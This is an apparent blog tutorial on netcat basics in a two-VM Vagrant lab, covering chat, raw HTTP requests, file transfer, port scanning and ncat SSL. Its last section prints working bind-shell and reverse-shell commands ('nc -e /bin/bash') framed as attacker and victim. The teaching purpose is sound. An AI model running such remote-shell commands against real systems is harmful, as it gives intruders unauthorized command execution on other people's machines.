Title: Netcat basics
Category: Cybersecurity
Tags: netcat, vagrant
Modified: 2024-12-19


Netcat is known as the TCP/IP swiss army knife. It's often used to either connect to an open TCP port (client-mode), or to listen on a port (server-mode).
It can also work with UDP, do port scanning and even be used to execute [remote shells](https://en.wikipedia.org/wiki/Shell_shoveling).
It's a commonly used tool in [CTFs](https://en.wikipedia.org/wiki/Capture_the_flag_(cybersecurity)) and cybersecurity in general.

This post will cover the basic usage.

## Testing setup

To test the connection between 2 machines, we will use Vagrant to create 2 virtual machines. Vagrant is very simple to use, see [this post]({filename}/posts/2015-11-23-virtual-machines-with-vagrant.md) for the basics.

``` { .ruby filename="Vagrantfile" }
VAGRANTFILE_API_VERSION = "2"

Vagrant.configure(VAGRANTFILE_API_VERSION) do |config|
  config.vm.box = "kalilinux/rolling"

  config.vm.define "alice" do |alice|
    alice.vm.hostname = "alice"
    alice.vm.network :private_network, ip: "192.168.33.210"
    alice.vm.provision "shell", inline: "echo 192.168.33.211 bob >> /etc/hosts"
  end

  config.vm.define "bob" do |bob|
    bob.vm.hostname = "bob"
    bob.vm.network :private_network, ip: "192.168.33.211"
    bob.vm.provision "shell", inline: "echo 192.168.33.210 alice >> /etc/hosts"
  end

  config.vm.provision "shell", inline: "apt-get update && apt-get install -y ncat
end
```

Put this `Vagrantfile` in a new folder and use `vagrant up` to create the VMs.
Then in 2 separate command prompts, use `vagrant ssh alice` and `vagrant ssh bob` to SSH into them.

## Basic chat

To see what netcat does, we will do a very basic chat.
We'll simply connect the two machines, send hello messages from both sides then kill the connection (with `<Ctrl-C>`).

`alice` will act as the server and `bob` as the client.
Note that the "client" and "server" terms are only used for the connection setup.
Once the connection is established, both sides can send and receive data.

### Server

To listen on a port: `nc -l -p <port>`.

```console
vagrant@alice:~$ nc -l -p 4444
```

### Client

To connect to a TCP port: `nc <destination> <port>`.
Destination can be an IP address or a DNS name.
In our case, `alice` was added to `/etc/hosts` in the `Vagrantfile` above.

```console
vagrant@bob:~$ nc alice 4444
```

### Output

Here is the output from both machines.
The `-v` option is for `verbose`, which shows the "listening on" and "connect to/from" messages.
The `-n` option tells netcat to skip the reverse DNS lookup.

```console hl_lines="4"
vagrant@alice:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.33.210] from (UNKNOWN) [192.168.33.211] 41025
Hello from alice!
Hello from bob!
```

```console hl_lines="4 5"
vagrant@bob:~$ nc -v alice 4444
alice [192.168.33.210] 4444 (?) open
Hello from alice!
Hello from bob!
<Ctrl-C>
```

The highlighted lines are input sent from the prompt. As you can see, both sides can send and receive.

### Packets

Here is the full conversation as captured by tcpdump (I grouped the packets so it's easier to follow).

```console 
vagrant@alice:~$ sudo tcpdump -i eth1 -ttttt port 4444
tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
listening on eth1, link-type EN10MB (Ethernet), capture size 65535 bytes

00:00:00.000000 IP bob.41025 > alice.4444: Flags [S], seq 572573479, win 29200, options [mss 1460,sackOK,TS val 4294936802 ecr 0,nop,wscale 6], length 0
00:00:00.000029 IP alice.4444 > bob.41025: Flags [S.], seq 2846467502, ack 572573480, win 28960, options [mss 1460,sackOK,TS val 4294952445 ecr 4294936802,nop,wscale 6], length 0
00:00:00.000120 IP bob.41025 > alice.4444: Flags [.], ack 1, win 457, options [nop,nop,TS val 4294936802 ecr 4294952445], length 0

00:00:06.248799 IP alice.4444 > bob.41025: Flags [P.], seq 1:19, ack 1, win 453, options [nop,nop,TS val 4294954007 ecr 4294936802], length 18
00:00:06.249013 IP bob.41025 > alice.4444: Flags [.], ack 19, win 457, options [nop,nop,TS val 4294938364 ecr 4294954007], length 0

00:00:09.239254 IP bob.41025 > alice.4444: Flags [P.], seq 1:17, ack 19, win 457, options [nop,nop,TS val 4294939111 ecr 4294954007], length 16
00:00:09.239285 IP alice.4444 > bob.41025: Flags [.], ack 17, win 453, options [nop,nop,TS val 4294954754 ecr 4294939111], length 0

00:00:12.288043 IP bob.41025 > alice.4444: Flags [F.], seq 17, ack 19, win 457, options [nop,nop,TS val 4294939873 ecr 4294954754], length 0
00:00:12.288146 IP alice.4444 > bob.41025: Flags [F.], seq 19, ack 18, win 453, options [nop,nop,TS val 4294955517 ecr 4294939873], length 0
00:00:12.288380 IP bob.41025 > alice.4444: Flags [.], ack 20, win 457, options [nop,nop,TS val 4294939873 ecr 4294955517], length 0
```

- First 3 packets: standard tcp 3-way handshake (SYN, SYN-ACK, ACK).
- Next 2: alice sending its hello message and bob's ack.
- Next 2: bob sending its hello message and alice's ack.
- Final 3: connection getting killed.

## Example usages

Here are some interesting usages of netcat.

### Connecting to a web server

Simply connect to the web server on port 80. You can then do a manual HTTP request.

```console hl_lines="2 3"
$ nc -C perdu.com 80
GET / HTTP/1.1
Host: perdu.com

HTTP/1.1 200 OK
...

<html><head><title>Vous Etes Perdu ?</title></head><body><h1>Perdu sur l'Internet ?</h1><h2>Pas de panique, on va vous aider</h2><strong><pre>    * <----- vous &ecirc;tes ici</pre></strong></body></html>
```

The `-C` option is to send CRLF instead of LF, [following the HTTP standard](http://stackoverflow.com/a/5757349/3672769).
Note that the highlighted lines were typed manually.

### Piping the result of a command

We could have avoided the manual typing in the previous example by piping the result of a command into netcat.

```console
$ printf 'GET / HTTP/1.1\r\nHost: perdu.com\r\n\r\n' | nc perdu.com 80
HTTP/1.1 200 OK
...

<html><head><title>Vous Etes Perdu ?</title></head><body><h1>Perdu sur l'Internet ?</h1><h2>Pas de panique, on va vous aider</h2><strong><pre>    * <----- vous &ecirc;tes ici</pre></strong></body></html>
```

### Transferring files

You can transfer files (it works for binaries too) using shell redirections.

```console hl_lines="6"
vagrant@alice:~$ nc -nvlp 4444 > received-file
listening on [any] 4444 ...
connect to [192.168.33.210] from (UNKNOWN) [192.168.33.211] 41034

vagrant@alice:~$ cat received-file
This is text written by bob
```

```console hl_lines="1"
vagrant@bob:~$ echo 'This is text written by bob' > file-to-transfer.txt

vagrant@bob:~$ nc -v alice 4444 < file-to-transfer.txt
alice [192.168.33.210] 4444 (?) open

vagrant@bob:~$
```

### Port scanning

If you don't want to interact with the port and just want to verify if it's open, use the `-z` option.

```console
vagrant@bob:~$ nc -vz alice 4444
alice [192.168.33.210] 4444 (?) open
```

For a range (an extra `-v` is needed to show the closed ports):

```console
vagrant@bob:~$ nc -vvz alice 4443-4445
alice [192.168.33.210] 4445 (?) : Connection refused
alice [192.168.33.210] 4444 (?) open
alice [192.168.33.210] 4443 (?) : Connection refused
```

*For more advanced port scanning, you should use a real port scanner, such as [nmap](https://nmap.org).*

## Differences between netcat versions

There are 2 main versions of netcat: traditional and OpenBSD.
So far, we used the traditional version, installed by default on Kali Linux.

Here are the package descriptions (credits to [this askubuntu question](http://askubuntu.com/a/426320)):

```console
$ apt-cache show netcat-traditional
...
 This is the "classic" netcat, written by *Hobbit*. It lacks many
 features found in netcat-openbsd.
...
$ apt-cache show netcat-openbsd
...
 This package contains the OpenBSD rewrite of netcat, including support
 for IPv6, proxies, and Unix sockets.
...
```

There is also an important differences in the usage of the "listen" mode.
They both use the `-l` option, but the OpenBSD version doesn't use `-p` to set the port.
So it looks like this: `nc -l 4444` instead of `nc -lp 4444`.

The OpenBSD version also doesn't contain the command execution (`-e` and `-c`) options (more on that below).

## Encrypted connections

Neither traditional nor OpenBSD netcat support encryption.
There is, however, a newer and improved implementation, called `ncat`, that does.
It is written by the [nmap](https://nmap.org) team and has been bundled with nmap since [version 5](https://nmap.org/5/).

> Ncat [...] is the culmination of the currently splintered family of Netcat incarnations.
>
> -- ncat manpage

It supports all the options from both versions of netcat (including `-e`/`-c`) and adds some really interesting ones, like a list of allowed and denied IPs and, of course... [SSL](https://nmap.org/ncat/guide/ncat-ssl.html)!
It's as simple as adding `--ssl` to both sides.

```console hl_lines="9"
vagrant@alice:~$ ncat --ssl -vl 4444
Ncat: Version 6.40 ( http://nmap.org/ncat )
Ncat: Generating a temporary 1024-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
Ncat: SHA-1 fingerprint: 7A3A 0A5F 35BA DCB4 A4F0 72B6 C1E0 2647 218F 29CB
Ncat: Listening on :::4444
Ncat: Listening on 0.0.0.0:4444
Ncat: Connection from 192.168.33.211.
Ncat: Connection from 192.168.33.211:41032.
Hello from alice!
Hello from bob!
```

```console hl_lines="6"
vagrant@bob:~$ ncat --ssl -v alice 4444
Ncat: Version 6.40 ( http://nmap.org/ncat )
Ncat: SSL connection to 192.168.33.210:4444.
Ncat: SHA-1 fingerprint: 7A3A 0A5F 35BA DCB4 A4F0 72B6 C1E0 2647 218F 29CB
Hello from alice!
Hello from bob!
```

## Remote shell

Traditional netcat and `ncat` both provide the `-c` and `-e` options[ref]It's possible to simulate these options in OpenBSD's netcat [by using named pipes](https://superuser.com/a/691043).[/ref], which lets you execute a program or a shell command after the connection.
It can be a very dangerous option if you don't know what you're doing, and was actually called `GAPING_SECURITY_HOLE` at some point in [traditional netcat's source code](http://sourceforge.net/p/netcat/code/HEAD/tree/tags/netcat-0.2.2/src/netcat.c#l271).

This can be used to run a [simple web server](https://nmap.org/ncat/guide/ncat-tricks.html#ncat-httpserv) for example, but the case that interests us is the execution of remote shells. This topic can go really deep, but here is a quick primer.

### Bind shell

A bind shell is when the shell is executed on the server/listener.
The remote attacker can then simply connect to the port to receive the shell.

```console
vagrant@alice:~$ nc -nvlp 4444 -e /bin/bash
listening on [any] 4444 ...
connect to [192.168.33.210] from (UNKNOWN) [192.168.33.211] 60146
```

```console hl_lines="3"
vagrant@bob:~$ nc -v alice 4444
alice [192.168.33.210] 4444 (?) open
hostname
alice
```

Here, `bob` is the attacker. He connected to `alice` on port 4444 and was able to execute the `hostname` command.

### Reverse shell

As its name implies, a reverse shell is executed on the other side.
The attacker starts its listener, then waits for the victim to send its shell.

```console hl_lines="4"
vagrant@alice:~$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [192.168.33.210] from (UNKNOWN) [192.168.33.211] 35428
hostname
bob
```

```console
vagrant@bob:~$ nc -v alice 4444 -e /bin/bash
alice [192.168.33.210] 4444 (?) open
```

Here, `alice` is the attacker. She started her listener and received the shell from `bob`, allowing her to run the `hostname` command.
